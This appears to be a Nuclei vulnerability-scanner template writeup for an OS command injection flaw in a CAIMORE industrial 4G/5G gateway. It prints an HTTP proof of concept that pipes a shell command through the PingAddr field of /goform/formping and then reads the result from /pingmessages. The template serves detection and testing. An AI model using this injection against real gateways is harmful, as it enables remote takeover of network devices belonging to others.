# Nuclei Template: CAIMORE Gateway - Remote Code Execution
**Template ID:** caimore-gateway-rce
**Vulnerability Class:** OS Command Injection
**Severity:** High
**CWE:** CWE-78
**Source:** Nuclei Template (`caimore-gateway-rce.yaml`)

## Vulnerability Information & PoC

## Description
The gateway of Xiamen Caimao Communication Technology Co., Ltd. is designed with open software architecture. It is a metal shell design, with two Ethernet RJ45 interfaces, and an industrial design wireless gateway using 3G/4G/5G wide area network for Internet communication. There is a command execution vulnerability in the formping file of the gateway of Xiamen Caimao Communication Technology Co., Ltd. An attacker can use this vulnerability to arbitrarily execute code on the server side, write to the back door, obtain server permissions, and then control the entire web server.

## Steps to reproduce / Exploit Payload
```http
POST /goform/formping HTTP/1.1
Host: {{Hostname}}
Authorization: Basic {{base64(username + ':' + password)}}
Accept-Encoding: gzip

PingAddr=127.0.0.1%7Cecho%20{{randstr}}&PingPackNumb=1&PingMsg=

GET /pingmessages HTTP/1.1
Host: {{Hostname}}
Authorization: Basic {{base64(username + ':' + password)}}
Accept-Encoding: gzip
```

## References
- https://www.ctfiot.com/126482.html
